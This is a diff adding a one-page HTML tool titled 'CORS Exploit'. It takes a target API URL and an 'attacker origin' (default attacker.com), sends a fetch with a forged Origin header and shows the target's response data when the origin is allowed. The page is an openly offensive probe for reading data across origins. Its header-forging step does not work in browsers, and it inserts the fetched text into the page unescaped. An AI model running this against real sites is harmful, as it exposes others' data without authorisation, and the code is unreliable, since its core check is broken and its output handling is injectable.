@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CORS Exploit</title>
+  <style>
+    body {
+      font-family: monospace;
+      margin: 20px;
+      font-size: 14px;
+    }
+    input[type="text"], input[type="url"] {
+      padding: 10px;
+      margin: 10px 0;
+      width: 300px;
+    }
+    button {
+        margin-top: 10px;
+      padding: 4px 10px;
+      font-size: 16px;
+      background-color: #e31624;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #45a049;
+    }
+    .result {
+      margin-top: 20px;
+      padding: 10px;
+      border: 1px solid #ddd;
+      background-color: #f9f9f9;
+    }
+    .error {
+      color: red;
+    }
+    .success {
+      color: green;
+    }
+    #reset-btn {
+      margin-top: 10px;
+      padding: 4px 10px;
+      font-size: 16px;
+      background-color: #080505;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>CORS Exploit</h1>
+  <p>Enter the vulnerable URL to perform CORS exploit.</p>
+
+  <label for="target-url">Vulnerable URL:</label>
+  <input type="url" id="target-url" placeholder="https://vulnerable-site.com/api" required><br>
+
+  <label for="attacker-origin">Attacker's Origin (e.g., http://attacker.com):</label>
+  <input type="text" id="attacker-origin" value="http://attacker.com" required><br>
+
+  <button onclick="exploitCORS()">Exploit</button>
+    <!-- Reset Button -->
+    <button id="reset-btn" onclick="resetFields()">Reset</button>
+
+  <div id="result" class="result"></div>
+
+  <script>
+    async function exploitCORS() {
+      const targetUrl = document.getElementById('target-url').value;
+      const attackerOrigin = document.getElementById('attacker-origin').value;
+      const resultDiv = document.getElementById('result');
+
+      if (!targetUrl || !attackerOrigin) {
+        resultDiv.innerHTML = "<p class='error'>Please provide a valid URL and attacker origin.</p>";
+        return;
+      }
+
+      resultDiv.innerHTML = "<p>Sending CORS request...</p>";
+
+      try {
+        const response = await fetch(targetUrl, {
+          method: 'GET',
+          mode: 'cors',
+          headers: {
+            'Origin': attackerOrigin // Set the malicious origin
+          }
+        });
+
+        if (response.ok) {
+          const text = await response.text();
+          const allowedOrigin = response.headers.get('Access-Control-Allow-Origin');
+          
+          if (allowedOrigin === attackerOrigin || allowedOrigin === '*') {
+            resultDiv.innerHTML = `
+              <p class='success'>[+] Vulnerable! The server allowed the origin: ${allowedOrigin}</p>
+              <p><strong>Response Data:</strong></p>
+              <pre>${text}</pre>
+            `;
+          } else {
+            resultDiv.innerHTML = "<p class='error'>[-] The server did not allow the attacker's origin.</p>";
+          }
+        } else {
+          resultDiv.innerHTML = `<p class='error'>[-] Error: ${response.status} ${response.statusText}</p>`;
+        }
+      } catch (error) {
+        resultDiv.innerHTML = `<p class='error'>[!] Error: ${error.message}</p>`;
+      }
+    }
+    function resetFields() {
+      // Reset the input fields
+      document.getElementById('target-url').value = '';
+      document.getElementById('attacker-origin').value = 'http://attacker.com';
+      
+      // Clear the result area
+      document.getElementById('result').innerHTML = '';
+    }
+  </script>
+
+</body>
+</html>
